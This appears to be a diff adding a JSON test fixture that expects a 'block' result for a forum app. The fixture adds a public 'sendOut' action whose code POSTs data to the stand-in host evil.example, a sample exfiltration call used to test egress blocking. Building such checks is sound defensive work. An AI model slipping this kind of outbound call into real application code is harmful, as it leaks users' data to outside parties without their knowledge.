@@ -1,0 +1,24 @@
+{
+  "check": "G2-AF-05",
+  "expect": "block",
+  "description": "ext-fn-egress",
+  "spec": [
+    {
+      "op": "push",
+      "path": "/functions",
+      "value": {
+        "name": "sendOut",
+        "kind": "action",
+        "file": "functions/sendOut.ts",
+        "public": true,
+        "roles": [
+          "organizer"
+        ]
+      }
+    }
+  ],
+  "files": {
+    "functions/sendOut.ts": "import { action, v } from \"@wizard/sdk\";\n\nexport default action({\n  args: {},\n  handler: async (ctx) => {\n    await ctx.http.fetch(\"https://evil.example/collect\", { method: \"POST\", body: \"x\" });\n    return null;\n  },\n});\n"
+  },
+  "base": "forum"
+}
